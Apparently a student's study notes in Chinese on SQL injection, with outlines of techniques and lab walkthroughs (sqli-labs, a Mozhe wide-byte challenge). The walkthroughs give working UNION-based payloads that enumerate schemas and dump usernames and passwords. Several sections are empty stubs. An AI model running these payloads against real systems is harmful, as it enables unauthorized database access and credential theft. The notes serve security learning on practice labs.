## 1.SQL注入原理

用户输入的数据被SQL解释器执行了

## 2.寻找SQL注入

### 1.手动测试

```
1.找注入点
2.让报错 ‘
3.尝试使用SQL语句进行
```



* 操纵用户数据输入并分析服务器响应来寻找SQL注入漏洞

  常见错误

* 字符串内联注入

* 数字内联注入

* 终止式

* 执行多条语句

* 时间延迟

  测试是否存在SQL注入时，出现难以确认的情况，可以向数据库注入时间延迟

### 2.复查源代码

* 危险的编码
* 危险的函数
* 跟踪数据
* Android？？？
* PL/SQL,T-SQL????
* 自动复查？？工具？？

### 3.sqlmap



## 4.利用SQL注入

（1）UNION

（2）order by

（3）万能密码

（4）避开输入过滤器

（5）二阶注入

（6）使用混合攻击

### 4.利用操作系统

（1）读文件

（2）写文件

（3）执行操作系统命令

（4）rootkit



## 5.注入漏洞分类

### 1.基于响应的注入

### 2.基于时间的注入

有一种判断在其中，感觉是布尔注入的一种

各种数据库

* MySQL

  sleep()

* SQL Server

  delay '0:0:5'

* Oracle

* Access

### 3.布尔注入

### 4.宽字节注入

### 5.二阶注入



## 6.常见数据库注入

### 1.MySQL

（1）元数据
* information_schema是信息数据库
  * schemata表是所有数据库信息的表
    * schema_name：数据库名
  * tables表是所有表的信息表
    * table_name：表名
    * table_schema：数据库名
  * columns表是所有列信息的表
    * column_name：列名
    * table_name：表名
    * table_schema：数据库名
* group_concat与concat![截图录屏_选择区域_20200602171037](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200602171037.png)



### 2.SQL Server

### 3.Access

### 4.Oracle





## 7.预防SQL注入及漏洞修复

## 8.SQL注入练习

### 注入流程

（1）测试是什么类型的注入

* and 1=2 -- a      可用于测试是否存在为数字型注入
* '  判断是否存在单引号注入
* id=1' -- 2    判断是否存在字符型注入

（2）输出当前表中有多少列

* order by 1,2,3.....

（3）判断回显位

* id= 1232'  and union select 1,2,3... -- q
* 注意id的取值为一个不存在的值
* select后的位数是表的列数
* 注意类型

（4）输出所有的数据库，当前数据库

* id= 1232'  and union select 1,(select  group_concat(schema_name) from information_schema.schemata),3... -- q
* database()，schema() 

（5）输出某个库中的所有表的表名

* id= 1232'  and union select 1,(select  group_concat(table_name) from information_schema.tables where table_schema = 'security'),3... -- q

（6）输出某个表的列名

* id= 1232'  and union select 1,(select  group_concat(column_name) from information_schema.columns where table_name = 'security.users'),3... -- q

（7）输出某列数据

* id= 1232'  and union select 1,(select  group_concat(username) from security.users),3... -- q





### 1.sqlilabs

链接：http://111.231.88.117/sqli_lab/sqli-labs-php7/#fm_imagemap

（1）单引号 字符型注入

* 要求输入id

![截图录屏_选择区域_20200526235216](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235216.png)

* 按直觉输入1

![截图录屏_选择区域_20200526235239](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235239.png)

* 输入`id=1 and 1=2` 发现不是数值型注入

![截图录屏_选择区域_20200526235310](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235310.png)

* 输入`id=1'`

![截图录屏_选择区域_20200526235334](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235334.png)

* 输入注释发现是字符型注入

![截图录屏_选择区域_20200526235354](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235354.png)

* 输出当前表的列数，发现为4列

![截图录屏_选择区域_20200526235422](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235422.png)

![截图录屏_选择区域_20200526235433](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235433.png)

* 查看回显位，2和3为回显位，可用来输出有用信息

![截图录屏_选择区域_20200526235704](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235704.png)

* 输出当前数据库名称

![截图录屏_选择区域_20200526235837](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200526235837.png)

* 查看当前库中的表

  `id=q' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),database()-- 1`

![截图录屏_选择区域_20200527000100](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527000100.png)

* 查看users表中的列

  `id=q' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),(select group_concat(column_name) from information_schema.columns where table_name = 'users')-- 1`

![截图录屏_选择区域_20200527000100](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527000343.png)

* 查看username，password列中信息

  `id=p' union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)-- 1`

![截图录屏_选择区域_20200527000501](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200527000501.png)

（2）数值型注入

* 通过and 1 = 2判断

* 看回显时id取不太可能的数字，比如-1
* 不需要注释

（3）

### 2.墨者学院

（1）SQL注入实战-MySQL

![截图录屏_选择区域_20200626121148](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200626121148.png)

使用sqlmap

（2）SQL注入漏洞测试(宽字节)

![截图录屏_选择区域_20200627083623](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627083623.png)

* 打开靶场

  ![截图录屏_选择区域_20200627092010](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627092010.png)

  在这琢磨半天，发现居然是这个停机维护通知

  ![截图录屏_选择区域_20200627090446](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090446.png)

* 打开后进入这个界面

  ![截图录屏_选择区域_20200627090418](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090418.png)

* 题目说明是宽字节，所以直接测试`id=p%df'`

  ![截图录屏_选择区域_20200627092227](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627092227.png)

* 接下来直接测试，union、order by、select 

  ![截图录屏_选择区域_20200627090358](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090358.png)

  ![截图录屏_选择区域_20200627090333](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090333.png)

  ![截图录屏_选择区域_20200627090323](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090323.png)

  发现5列，且显示位置为5

* 测试当前数据库

  ![截图录屏_选择区域_20200627090314](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090314.png)

* 接下来测表和列注意不能使用'，可以使用16进制的表名和库名

  ![截图录屏_选择区域_20200627090254](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090254.png)

  ![截图录屏_选择区域_20200627090240](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090240.png)

  

* 得到两个用户名和密码

  ![截图录屏_选择区域_20200627090228](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090228.png)

  ![截图录屏_选择区域_20200627090210](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090210.png)

* 第一个被禁用，第二个可以

  ![截图录屏_选择区域_20200627090143](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090143.png)

  ![截图录屏_选择区域_20200627091425](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627091425.png)

  ![截图录屏_选择区域_20200627090113](/home/garlic/Desktop/笔记/图片/截图录屏_选择区域_20200627090113.png)

### 3.webug4.0

